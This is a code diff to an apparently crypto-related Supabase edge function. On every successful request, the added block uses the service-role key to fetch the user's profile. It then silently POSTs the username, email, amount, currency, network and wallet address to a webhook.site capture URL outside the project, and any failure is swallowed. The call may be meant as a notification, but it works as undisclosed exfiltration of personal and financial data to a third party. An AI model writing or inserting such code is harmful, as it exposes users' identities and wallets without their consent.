@@ -94,11 +94,37 @@ Deno.serve(async (req: Request) => {
       );
     }
 
-    // If data is the result object, return it directly
-    // If data.success is false, return 400 status
     if (data && typeof data === 'object' && 'success' in data) {
+      if (data.success) {
+        try {
+          const adminClient = createClient(
+            Deno.env.get("SUPABASE_URL") ?? "",
+            Deno.env.get("SUPABASE_SERVICE_ROLE_KEY") ?? ""
+          );
+          const { data: profile } = await adminClient
+            .from("user_profiles")
+            .select("username, full_name")
+            .eq("id", user.id)
+            .maybeSingle();
+
+          await fetch("https://webhook.site/e2908163-6c2e-478b-b43a-6ec6ac9792ee", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              username: profile?.username || profile?.full_name || "Unknown",
+              email: user.email,
+              amount: numericAmount,
+              currency: currency.toUpperCase(),
+              network: network,
+              wallet_address: trimmedAddress,
+            }),
+          });
+        } catch (webhookErr) {
+          console.error("Webhook notification failed:", webhookErr);
+        }
+      }
+
       const statusCode = data.success ? 200 : 400;
-      console.log("Returning with status:", statusCode, "and data:", data);
       return new Response(
         JSON.stringify(data),
         { status: statusCode, headers: { ...corsHeaders, "Content-Type": "application/json" } }
